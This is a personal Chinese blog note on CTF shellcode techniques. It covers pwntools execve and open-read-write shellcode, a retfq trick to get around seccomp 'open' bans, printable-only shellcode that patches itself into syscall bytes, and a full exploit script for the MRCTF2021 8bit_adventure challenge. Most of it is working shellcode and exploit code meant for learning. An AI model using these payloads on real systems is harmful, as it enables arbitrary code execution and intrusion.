---
title: shellcode 的 issue
tags:
  - binary
---
> 本文章为个人笔记性质。如有错误，请多多指教。
>
> 谐音梗。issue──>艺术

## 前言

CSAPP 中 有一章专门讲了 Y86-64 这一指令集。Y86 指令中，前 4bit 是指令的类型，通过这一位我们可以判断指令的类型。之后通过一些翻译类型的题目，我感受到了指令的构成。并且通过这些指令初步感受到了各类指令所占空间的大小。正好前一段时间做过一道 shellcode 的题目，因此来研究一波。

## 从 pwntools 说起

i386 shellcraft.sh()

```assembly
 	/* execve(path='/bin///sh', argv=['sh'], envp=0) */
    /* push '/bin///sh\x00' */
    push 0x68
    push 0x732f2f2f
    push 0x6e69622f
    mov ebx, esp
    /* push argument array ['sh\x00'] */
    /* push 'sh\x00\x00' */
    push 0x1010101
    xor dword ptr [esp], 0x1016972
    xor ecx, ecx
    push ecx /* null terminate */
    push 4
    pop ecx
    add ecx, esp
    push ecx /* 'sh\x00' */
    mov ecx, esp
    xor edx, edx
    /* call execve() */
    push SYS_execve /* 0xb */
    pop eax
    int 0x80
```

amd64 shellcraft.sh()

```assembly
 	/* execve(path='/bin///sh', argv=['sh'], envp=0) */
    /* push '/bin///sh\x00' */
    push 0x68
    mov rax, 0x732f2f2f6e69622f
    push rax
    mov rdi, rsp
    /* push argument array ['sh\x00'] */
    /* push 'sh\x00' */
    push 0x1010101 ^ 0x6873
    xor dword ptr [rsp], 0x1010101
    xor esi, esi /* 0 */
    push rsi /* null terminate */
    push 8
    pop rsi
    add rsi, rsp
    push rsi /* 'sh\x00' */
    mov rsi, rsp
    xor edx, edx /* 0 */
    /* call execve() */
    push SYS_execve /* 0x3b */
    pop rax
    syscall
```

这些都是 pwntools 自带的 shellcode。可以直接拿来用。如果不想直接使用这些，可以自行构造。

例如一些汇编指令类：

```python
shellcraft.push('rax')
shellcraft.mov('eax', 'SYS_execve')
shellcraft.xor(0xdeadbeef,'rsp',32)
```

 或者你想直接利用 Pwntools 来写 orw：

```python
shellcode = shellcraft.open('/flag')
shellcode += shellcraft.read(0,'rsp',0x30)
shellcode += shellcraft.write(1,'rsp',0x30)
```

结果如下：

```assembly
    /* open(file='/flag', oflag=0, mode=0) */
    /* push '/flag\x00' */
    mov rax, 0x101010101010101
    push rax
    mov rax, 0x101010101010101 ^ 0x67616c662f
    xor [rsp], rax
    mov rdi, rsp
    xor edx, edx /* 0 */
    xor esi, esi /* 0 */
    /* call open() */
    push SYS_open /* 2 */
    pop rax
    syscall
    /* call read(0, 'rsp', 0x30) */
    xor eax, eax /* SYS_read */
    xor edi, edi /* 0 */
    push 0x30
    pop rdx
    mov rsi, rsp
    syscall
    /* write(fd=1, buf='rsp', n=0x30) */
    push 1
    pop rdi
    push 0x30
    pop rdx
    mov rsi, rsp
    /* call write() */
    push SYS_write /* 1 */
    pop rax
    syscall
```

这么一来，我们可以直接利用 pwntools 来进行常规 shellcode 的编写了。在没有进行 字符限制 的情况下，直接利用 `shellcraft` 确实是很方便的方法。

如果遇到了禁用 `open` 系统调用的题目，那一般会故意留一个 `ALLOW` 的系统调用 `fstat`。系统调用号为 5。但是在 32 位运行模式下 5 号系统调用是 `open`。所以可以通过 `retfq` 指令进行运行模式的转换，从而达到能够使用 `open` 系统调用的效果：

```assembly
push retaddress
push 0x23
retfq
```

注意 retaddress 会被解析成 32 位的地址

重新回到 64 位运行模式的方法：

```assembly
jmp 0x33:retaddress
```

## 但是

但是总有一些题目、一些出题人喜欢在题目里面塞💩️。那么如何限制 shellcode 呢？很简单无脑的一种方法就是限制输入的字符，如果力求模拟真实情况的话。例如：

```c
{
    char buf[32];
    read(0,buf,32);
    for (int i=0;i<strlen(buf);i++){
        if(buf[i] < 32 || buf[i] > 126) exit(-1);
    }
}
```

这样就直接可以限制输入的 shellcode 为可打印字符。考虑到这种情况，首先考虑我们需要的系统调用能不能用。`int 0x80` 所对应的字节码是 `CD 80`，明显不可打印；`syscall`  对应的字节码是 `0F 05` ，也是不可打印的。首先想到的是用指令在输入后对 shellcode 进行操作，使其变成对应的系统调用。例如：

```c
// gcc -g -m64 -z execstack -no-pie shellcode1.c -o shellcode1
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>

int main() {
    char buf[0x400];
    int n, i;
    n = read(0, buf, 0x400);
    if (n <= 0) return 0;
    for (i = 0; i < n; i++) {
        if(buf[i] < 32 || buf[i] > 126) return 0;
    }
    ((void(*)(void))buf)();
}
```

我们用 `sub byte ptr [rsi + 0x], dl` 指令将两个可打印字符写成 `syscall`。

```python
payload = asm("""
push 0x6f
pop rdx
push rbx
push rbx
push rbx
push rsp
pop rsi
sub byte ptr [rsi+0x3e], dl
sub byte ptr [rsi+0x3f], dl
""")
payload += "\x7e\x74"
```

此处用 `push` 指令对栈的相对位置进行了调整。然后通过 `push pop` 的组合来达到 `mov` 的效果，最后计算位置，将 `\x7e\x74` 转换成 `\x0f\x05`。

效果：

```assembly
# 转换前
0x7fff576dbb4e:	jle    0x7fff576dbbc4
# 转换后
0x7fff576dbb4e:	syscall
```

在 [shellcode的艺术](https://xz.aliyun.com/t/6645) 中有一段关于可打印字符 shellcode 的总结，这里抄录过来。

```
1.数据传送:
push/pop eax…
pusha/popa

2.算术运算:
inc/dec eax…
sub al, 立即数
sub byte ptr [eax… + 立即数], al dl…
sub byte ptr [eax… + 立即数], ah dh…
sub dword ptr [eax… + 立即数], esi edi
sub word ptr [eax… + 立即数], si di
sub al dl…, byte ptr [eax… + 立即数]
sub ah dh…, byte ptr [eax… + 立即数]
sub esi edi, dword ptr [eax… + 立即数]
sub si di, word ptr [eax… + 立即数]

3.逻辑运算:
and al, 立即数
and dword ptr [eax… + 立即数], esi edi
and word ptr [eax… + 立即数], si di
and ah dh…, byte ptr [ecx edx… + 立即数]
and esi edi, dword ptr [eax… + 立即数]
and si di, word ptr [eax… + 立即数]

xor al, 立即数
xor byte ptr [eax… + 立即数], al dl…
xor byte ptr [eax… + 立即数], ah dh…
xor dword ptr [eax… + 立即数], esi edi
xor word ptr [eax… + 立即数], si di
xor al dl…, byte ptr [eax… + 立即数]
xor ah dh…, byte ptr [eax… + 立即数]
xor esi edi, dword ptr [eax… + 立即数]
xor si di, word ptr [eax… + 立即数]

4.比较指令:
cmp al, 立即数
cmp byte ptr [eax… + 立即数], al dl…
cmp byte ptr [eax… + 立即数], ah dh…
cmp dword ptr [eax… + 立即数], esi edi
cmp word ptr [eax… + 立即数], si di
cmp al dl…, byte ptr [eax… + 立即数]
cmp ah dh…, byte ptr [eax… + 立即数]
cmp esi edi, dword ptr [eax… + 立即数]
cmp si di, word ptr [eax… + 立即数]

5.转移指令:
push 56h
pop eax
cmp al, 43h
jnz lable

<=> jmp lable

6.交换al, ah
push eax
xor ah, byte ptr [esp] // ah ^= al
xor byte ptr [esp], ah // al ^= ah
xor ah, byte ptr [esp] // ah ^= al
pop eax

7.清零:
push 44h
pop eax
sub al, 44h ; eax = 0

push esi
push esp
pop eax
xor [eax], esi ; esi = 0
```

关于 sub, xor, and, cmp 部分，看似挺多，其实记住源操作数和目的操作数一个是 `byte ptr [reg + imm]`，另一个是 寄存器 就行了。

在这个基础上，手写可打印 shellcode 是很简单的。(

## 单字节 shellcode

> MRCTF2021 8bit_adventure 官方WP复现

假如我们在让用户输入 shellcode 时，让 shellcode 的每一个字节散乱地分布在一个区域内。

```c
s = mmap(0, 0x20000u, 7, 34, 0, 0);
memset(s, 0x90, 0x20000u);

*(s + i + rand() % 32) = input;
```

这样执行命令的时候只能执行单字节的 shellcode。

32 位运行模式下，对于`push`、`pop`、`inc`、`dec` 这种单操作数的指令，它们都是单字节的，可以使用。

本题给了一段后门。

```c
if ( v2 == 0xCDu )
{
    v1 = rand();
    *(v1 % 31 + i) = 0xCDu;
    *(v1 % 31 + 1 + i) = 0x80u;
} // disasm("\xcd\x80") int    0x80
```



也就是说，我们可以用栈和全部寄存器通过系统调用进行 orw

由于本题有`close(0)`，因此首先考虑怎么写 "flag" 字符串。受单字节 shellcode 限制，无法解引用。考虑用 pipe 做一个跳板，写 pipe 读 pipe 的方式。

```c
// demo.c
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>

int main(){
    int fd_pipe[2];
    char buf[0x30];
    pipe(fd_pipe);
    write(fd_pipe[1],"f",1);
    write(fd_pipe[1],"l",1);
    write(fd_pipe[1],"a",1);
    write(fd_pipe[1],"g",1);
    write(fd_pipe[1],"\x00",1);
    read(fd_pipe[0],buf,0x5);
    int fd = open(buf,O_RDONLY);
    read(fd,buf,0x30);
    write(1,buf,0x30);
}
```

我们用 `demo.c` 成功 orw 出了 flag。

由此看来，只用 `push`、`pop`、`inc`、`dec` 完全可以完成 orw。

构造 exp:

```python
from pwn import *
import base64
context.log_level='debug'

sh=process('./8bit_adventure')

payload = asm("""
pop edi
push eax
push ebx
push ebx
push ebx
pop eax
push esp
pop ebx
""")+ \
asm("inc eax")*42 + \
"\xcd" # pipe(fd_stack)

payload += asm("""
pop esi
pop ebx
""")+\
asm("""
dec edi
""")*0x5c5+\
asm("""
push edi
pop ecx
inc edx
inc eax
inc eax
inc eax
inc eax
""")+\
"\xcd" # write(fd_pipe[1],"f",1)

payload += asm("""
inc ecx
inc ecx
inc ecx
inc eax
inc eax
inc eax
""")+\
"\xcd" # write(fd_pipe[1],"l",1)

payload += asm("""
dec ecx
dec ecx
inc eax
inc eax
inc eax
""")+\
"\xcd" # write(fd_pipe[1],"a",1)

payload += asm("""
inc ecx
""")*0x1c+\
asm("""
inc eax
inc eax
inc eax
""")+\
'\xcd' # write(fd_pipe[1],"g",1)

payload += asm("""
dec ecx
inc eax
inc eax
inc eax
""")+\
'\xcd' # write(fd_pipe[1],"\x00",1)

payload += asm("""
push esi
pop ebx
inc eax
inc eax
pop ecx
inc edx
inc edx
inc edx
inc edx
""")+\
'\xcd' # read(fd_pipe[0],buf,0x5)

payload += asm("""
push ecx
pop ebx
push esi
push esi
pop ecx
pop edx
""")+\
'\xcd' # open("flag",0)

payload += asm("""
push ebx
push eax
pop ebx
dec eax
pop ecx
""")+\
asm("""
inc edx
""")*0x30+\
'\xcd' # read(fd_flag,buf,0x30)

payload += asm("""
push esi
pop eax
inc eax
inc eax
inc eax
inc eax
dec ebx
dec ebx
dec ebx
""")+\
'\xcd'+"\x00" # write(1,buf,0x30)

sh.sendafter('code',payload+"\x00")
sh.interactive()
```

## 未完

shellcode 还有诸多用法。例如用 `mprotect` 改写权限，利用 `sigreturn` 构造 SROP 等。做赛题时灵活运用。